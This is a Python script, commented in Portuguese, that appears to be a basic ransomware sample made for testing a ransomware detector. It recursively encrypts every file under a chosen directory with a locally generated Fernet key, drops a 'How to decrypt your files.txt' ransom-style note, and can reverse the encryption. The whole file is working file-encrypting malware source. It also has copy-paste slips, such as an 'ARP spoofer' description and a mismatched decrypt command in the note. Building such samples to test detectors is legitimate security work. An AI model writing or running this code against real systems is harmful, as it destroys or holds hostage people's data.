import os
import argparse
from cryptography.fernet import Fernet, InvalidToken

# Caminho teste para criptografar/descriptografar
# python basicaransomware.py -p "/home/matheusheidemann/Documents/Python Files/Python-Ransomware-Detector/ransomware-samples/encrypt-test".


# CLASSES
# Classe da chave de criptografia
class CryptoKey:
    # Gerar uma chave de criptografia
    def generateKey():
        key_value = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key_value)

    # Carregar a chave de criptografia gerada
    def loadKey():
        return open('key.key', 'rb').read()

     # Carregar a chave de criptografia gerada
    def deleteKey():
        key_path = os.path.join(os.getcwd(), 'key.key')
        if os.path.exists(key_path):
            os.remove(key_path)


class Ransomware:
    # Criar o arquivo de instruções
    def createTxt(directory):
        with open(directory + '/' + 'How to decrypt your files.txt', 'w') as file:
            file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by BASH BUNNY\n")
            file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")

    # Deletar o arquivo de instruções
    def deleteTxt(directory):
        if os.path.exists(directory + '/' + 'How to decrypt your files.txt'):
            os.remove(directory + '/' + 'How to decrypt your files.txt')

    # Criptografar/Descriptografar os arquivos
    def run(directory, key, action):
        if action == "decrypt":
            Ransomware.deleteTxt(directory)

        count = 0
        for current_path, _, files_in_current_path in os.walk(directory):
            for file in files_in_current_path:

                file_abs_full_path = os.path.join(current_path, file)

                with open(file_abs_full_path, 'rb') as file_bytes:
                    file_data = file_bytes.read()
                    if action == "encrypt":
                        final_data = Fernet(key).encrypt(file_data)
                    elif action == "decrypt":
                        final_data = Fernet(key).decrypt(file_data)

                with open(file_abs_full_path, 'wb') as file_bytes:
                    file_bytes.write(final_data)
                count += 1
                print(f"[+] {'Encrypted' if action == 'encrypt' else 'Decrypted'} {count} files...", end='\r')

        if action == "encrypt":
            Ransomware.createTxt(directory)

        print(f"Todos os arquivos do diretório '{directory}' e filhos foram {'criptografados' if action == 'encrypt' else 'descriptografados'} com sucesso!\n")


# FUNÇÕES
# Função para pegar os argumentos
def getArguments():
    parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
    parser.add_argument("-p", "--path", action="store", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-e", "--encrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-d", "--decrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    args = parser.parse_args()

    if args.encrypt and args.decrypt:
        print("ERRO - Você passou o argumento --encrypt e --decrypt! Por favor, use apenas um dos dois!")
        print("Finzalizando...")
        quit()

    if not args.encrypt and not args.decrypt:
        print("ERRO - Você não passou o argumento --encrypt ou --decrypt! Por favor, define qual a operação que será realizada!")
        print("Finzalizando...")
        quit()

    if args.path:
        if not os.path.exists(args.path):
            print("ERRO! O caminho fornecido não existe!")
            print("Finzalizando...")
            quit()
    else:
        print(f"ERRO! Você precisa fornecer um caminho para {'criptografar' if args.encrypt else 'descriptografar'}!")
        print("Finzalizando...")
        quit()

    return args


# MAIN
if __name__ == '__main__':
    args = getArguments()
    directory = args.path

    # Criptografar
    ppid = os.getppid()
    pid = os.getppid()
    print(f"[+] Starting B4S1CR4N0MW4R3 - PPID: {ppid} + PID: {pid}")

    if args.encrypt:
        key = CryptoKey.generateKey()
        key = CryptoKey.loadKey()
        Ransomware.run(directory, key, "encrypt")

    # Descriptografar
    elif args.decrypt:
        try:
            key = CryptoKey.loadKey()
            Ransomware.run(directory, key, "decrypt")
            CryptoKey.deleteKey()
        except InvalidToken:
            print('[+] Decrypted all files. Deleting key...')
            CryptoKey.deleteKey()

else:
    print()
